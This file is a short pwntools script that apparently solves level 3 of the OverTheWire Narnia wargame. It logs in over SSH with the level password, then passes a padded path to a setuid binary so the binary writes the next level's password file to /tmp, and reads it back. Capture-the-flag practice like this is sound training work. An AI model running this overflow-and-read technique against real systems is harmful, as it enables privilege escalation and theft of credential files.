#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia3', 
            'narnia.labs.overthewire.org', 
            password='vaequeezee',
            port=2226)

filename='/tmp/ia4'
s.upload_data('',filename)
p = s.process([b'/narnia/narnia3', b'////////////etc/narnia_pass/narnia4'],cwd='/tmp')
flag=s.download_data(filename)
print(flag[:10])
s.close()
